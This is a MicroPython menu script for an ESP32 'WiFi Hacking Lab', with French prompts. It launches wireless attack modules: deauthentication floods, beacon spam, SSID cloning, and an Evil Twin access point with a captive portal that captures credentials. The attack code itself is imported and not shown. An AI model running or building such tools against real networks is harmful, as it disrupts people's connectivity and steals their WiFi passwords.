import gc
from lib.display import banner, info, ok, warn, err, line, menu

# ── Helpers ───────────────────────────────────────────────────────────────────

def _int(prompt, default=None):
    try:
        raw = input("  {} : ".format(prompt)).strip()
        return int(raw) if raw else default
    except (ValueError, EOFError):
        return default


def _str(prompt, default=""):
    try:
        raw = input("  {} : ".format(prompt)).strip()
        return raw if raw else default
    except EOFError:
        return default


def _scan_and_select():
    from lib.wifi_scanner import scan, select
    nets = scan()
    if not nets:
        warn("Aucun réseau trouvé")
        return None
    return select(nets)


# ── Modules du menu ───────────────────────────────────────────────────────────

def _do_scanner():
    from lib.wifi_scanner import scan, scan_loop
    line()
    choix = _int("Mode  [1] Scan unique  [2] Scan en boucle", default=1)
    if choix == 2:
        interval = _int("Intervalle entre scans (s) [10]", default=10)
        scan_loop(interval=interval)
    else:
        scan()


def _do_sniffer():
    from lib.packet_sniffer import sniff
    line()
    duree   = _int("Durée de capture (s) [30]", default=30)
    canal   = _int("Canal fixe (0 = hopping) [0]", default=0)
    sniff(duration=duree, channel=canal if canal else None)


def _do_probe():
    from lib.probe_sniffer import sniff_probes
    line()
    duree = _int("Durée de capture (s) [60]", default=60)
    canal = _int("Canal fixe (0 = hopping) [0]", default=0)
    sniff_probes(duration=duree, channel=canal if canal else None)


def _do_deauth():
    from lib.deauth import deauth_client, deauth_broadcast, deauth_loop
    line()
    cible = _scan_and_select()
    if not cible:
        return

    ok("AP cible : {} ({})".format(cible["ssid"], cible["bssid"]))
    client = _str("MAC client à cibler (vide = broadcast)", default="")
    line()
    mode = _int("[1] Nombre fixe  [2] Continu  [1]", default=1)

    if mode == 2:
        interval = _int("Intervalle entre trames (ms) [100]", default=100)
        deauth_loop(cible["bssid"], client_mac=client or None,
                    interval_ms=interval)
    else:
        count    = _int("Nombre de trames [100]", default=100)
        interval = _int("Intervalle (ms) [100]", default=100)
        if client:
            deauth_client(cible["bssid"], client, count=count, interval_ms=interval)
        else:
            deauth_broadcast(cible["bssid"], count=count, interval_ms=interval)


def _do_beacon():
    from lib.beacon_spam import spam_random, spam_fr, spam_clone, spam
    line()
    info("[1] SSIDs aléatoires  [2] Opérateurs FR  [3] Liste personnalisée  [4] Clone SSID")
    mode  = _int("Mode [1]", default=1)
    canal = _int("Canal [6]", default=6)

    if mode == 1:
        spam_random(channel=canal)

    elif mode == 2:
        spam_fr(channel=canal)

    elif mode == 3:
        raw   = _str("SSIDs séparés par virgule")
        ssids = [s.strip() for s in raw.split(',') if s.strip()]
        if ssids:
            spam(ssids=ssids, channel=canal)
        else:
            warn("Aucun SSID fourni")

    elif mode == 4:
        ssid = _str("SSID à cloner")
        if ssid:
            spam_clone(ssid, channel=canal)
        else:
            warn("SSID vide")


def _do_evil_twin():
    from lib.evil_twin import start, show_captured, clear_log
    line()
    info("[1] Lancer Evil Twin  [2] Voir credentials capturés  [3] Effacer log")
    mode = _int("Mode [1]", default=1)

    if mode == 2:
        show_captured()
        return
    if mode == 3:
        clear_log()
        return

    # Mode 1 : lancer l'attaque
    cible = _scan_and_select()
    if not cible:
        return

    ok("Cible : {} ch{} {}".format(cible["ssid"], cible["ch"], cible["bssid"]))

    use_pwd = _str("Cloner le mot de passe WPA2 ? (laisser vide si réseau ouvert)")
    do_deauth = _str("Deauth l'AP réel en continu ? [o/N]", default="n").lower()

    start(
        ssid          = cible["ssid"],
        channel       = cible["ch"],
        password      = use_pwd or None,
        deauth_ap_mac = cible["bssid"] if do_deauth == 'o' else None,
    )


# ── Boucle principale ─────────────────────────────────────────────────────────

_MODULES = [
    ("Scanner WiFi",                   _do_scanner),
    ("Sniffer promiscuous (802.11)",   _do_sniffer),
    ("Probe Request sniffer",          _do_probe),
    ("Deauth attack",                  _do_deauth),
    ("Beacon spam",                    _do_beacon),
    ("Evil Twin + portail captif",     _do_evil_twin),
]


def run():
    banner()
    info("RAM libre : {} bytes".format(gc.mem_free()))
    line()

    while True:
        gc.collect()
        choix = menu("ESP32 WiFi Hacking Lab", [m[0] for m in _MODULES])

        if choix == 0:
            ok("À bientôt.")
            break

        if 1 <= choix <= len(_MODULES):
            label, fn = _MODULES[choix - 1]
            line()
            info(">>> {}".format(label))
            line()
            try:
                fn()
            except KeyboardInterrupt:
                warn("Interrompu — retour au menu")
            except Exception as e:
                err("Erreur : {}".format(e))
        else:
            warn("Choix invalide")


# Lancement automatique si main.py est le point d'entrée
run()
